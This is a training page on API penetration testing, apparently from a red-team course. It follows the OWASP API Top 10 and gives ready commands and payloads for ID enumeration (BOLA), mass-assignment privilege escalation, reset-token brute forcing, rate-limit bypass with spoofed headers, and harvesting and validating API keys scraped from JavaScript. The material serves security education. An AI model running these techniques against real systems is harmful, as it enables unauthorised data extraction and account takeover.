---
layout: training-page
title: "API Security Testing — Red Team Academy"
module: "Web Hacking"
tags:
  - api
  - bola
  - mass-assignment
  - broken-auth
  - rate-limiting
  - owasp-api
page_key: "web-api-testing"
render_with_liquid: false
---

# API Security Testing

API vulnerabilities account for the majority of data breaches in modern applications. The OWASP API Security Top 10 defines the key categories: Broken Object Level Authorization (BOLA/IDOR), broken authentication, excessive data exposure, lack of resources & rate limiting, and mass assignment. This page covers the full API attack methodology.

## API Recon & Discovery

```
# Find API endpoints via JS files:
curl https://target/ | grep -oP '"(api|v[0-9])/[^"]+"'
# Or: use JS file analysis tools:
gau https://target | grep "api\|/v[0-9]"

# Content discovery for API paths:
ffuf -u https://target/api/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -H "Content-Type: application/json" -mc 200,201,400,401,403,405

# API version brute force:
ffuf -u https://target/FUZZ/users -w <(echo -e "api\napi/v1\napi/v2\napi/v3\nv1\nv2\nv3\nrest") \
  -mc 200,201,400,401

# Find OpenAPI/Swagger spec:
/swagger.json, /openapi.json, /api-docs, /swagger-ui.html
/v1/swagger.json, /api/v1/openapi.yaml

# Parse Swagger for all endpoints:
python3 -c "
import json, sys
spec = json.load(open('swagger.json'))
for path in spec.get('paths', {}):
    for method in spec['paths'][path]:
        print(method.upper(), path)
"
```

## BOLA / IDOR (API1:2023)

```
# BOLA = Broken Object Level Authorization
# Access another user's objects by changing ID in request

# Horizontal privilege escalation:
GET /api/v1/users/1/profile     # your profile (user ID 1)
GET /api/v1/users/2/profile     # another user's profile → BOLA if returned

# UUID-based IDs (harder to guess but still test):
GET /api/v1/orders/550e8400-e29b-41d4-a716-446655440000

# Enumerate with Burp Intruder or ffuf:
ffuf -u https://target/api/v1/users/FUZZ/profile \
  -w <(seq 1 1000) \
  -H "Authorization: Bearer YOUR_TOKEN" -mc 200

# BOLA in POST/PUT body:
POST /api/v1/orders
{"userId": 2, "items": [...]}   # change userId to access another account

# BOLA in nested resources:
GET /api/v1/companies/1/employees    # company you don't own
DELETE /api/v1/posts/123             # post by another user
```

## Broken Authentication (API2:2023)

```
# Weak token entropy — brute forceable tokens:
# Try sequential IDs in tokens
# Check for predictable patterns in base64-decoded tokens

# API key in URL (logged in access logs):
GET /api/data?api_key=SECRET_KEY    # bad practice → try common keys
GET /api/data?token=SECRET_KEY

# No token expiry — tokens valid indefinitely:
# Log out, reuse old token → still works

# Password reset token brute force:
POST /api/v1/auth/reset-verify
{"token": "000001"}  # iterate through short tokens

# Missing authentication on sensitive endpoints:
GET /api/v1/admin/users
GET /api/v1/users/all       # returns all users without auth
DELETE /api/v1/user/1       # no auth check
```

## Excessive Data Exposure (API3:2023)

```
# API returns more fields than displayed in UI:
GET /api/v1/users/me
# Response contains: id, name, email, password_hash, ssn, credit_card, is_admin
# Frontend only displays: name, email

# Compare API response to UI — look for hidden sensitive fields
# Tools: Burp response comparison, mitmproxy

# GraphQL: request all fields explicitly to find hidden ones:
{ user(id:1) { id name email phone ssn creditCard isAdmin role } }

# Mass data extraction — paginate through all records:
GET /api/v1/users?page=1&limit=1000
GET /api/v1/users?page=2&limit=1000
# → dump entire user database
```

## Mass Assignment (API6:2023)

```
# App accepts extra fields in JSON body that map to internal model:
# Normal user update:
PUT /api/v1/user/profile
{"name": "John", "email": "john@test.com"}

# Add privileged fields:
{"name": "John", "email": "john@test.com", "role": "admin", "isAdmin": true, "credits": 9999}

# Find field names from:
# GET /api/v1/user/me → response shows all model fields
# Swagger/OpenAPI spec → full model definition
# JavaScript source → field references

# Test with extra fields and check response/behavior:
{"name": "test", "role": "admin"}
{"name": "test", "is_admin": 1}
{"name": "test", "balance": 99999}
{"name": "test", "verified": true}
```

## Rate Limiting Bypass (API4:2023)

```
# IP-based rate limiting bypass:
# Rotate IPs with X-Forwarded-For:
curl -H "X-Forwarded-For: 1.1.1.1" https://target/api/login
curl -H "X-Forwarded-For: 1.1.1.2" https://target/api/login

# Other bypass headers:
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
CF-Connecting-IP: 1.2.3.4
True-Client-IP: 1.2.3.4

# Null byte in username (different identifier, same user):
{"username": "admin\x00", "password": "test"}

# Case variation:
Admin, ADMIN, AdMiN → different rate limit bucket, same account

# Account-based (if limited per account):
# Distribute across many accounts

# GraphQL batching for brute force (see GraphQL page):
# 100 login attempts in 1 request → 1 request counted
```

## API Key Hunting

```
# JS files often contain hardcoded API keys:
# Extract all JS URLs:
gau https://target | grep "\.js$" | sort -u | xargs -I% sh -c 'curl -s "%" | grep -oE "[A-Za-z0-9_]{20,}"'

# GitHub dorking:
# site:github.com "target.com" "api_key"
# site:github.com "target.com" "Bearer"

# API key formats to look for:
# AWS: AKIA[0-9A-Z]{16}
# Stripe: sk_live_[a-zA-Z0-9]{24}
# Twilio: SK[a-z0-9]{32}
# Slack: xoxb-[0-9]{11}-[0-9]{11}-[a-zA-Z0-9]{24}

# Validate API keys:
# AWS: aws sts get-caller-identity
# GitHub: curl -H "Authorization: token KEY" https://api.github.com/user
```

## Tools & Resources

- Postman — API exploration and testing
- mitmproxy — intercept and modify API calls
- ffuf — API endpoint fuzzing
- Arjun — `github.com/s0md3v/Arjun` — parameter discovery
- OWASP API Security Top 10 — `owasp.org/www-project-api-security/`
- APIs guru — `apis.guru` — public API specs
- HackTricks API — `book.hacktricks.xyz/network-services-pentesting/pentesting-web/api-testing`
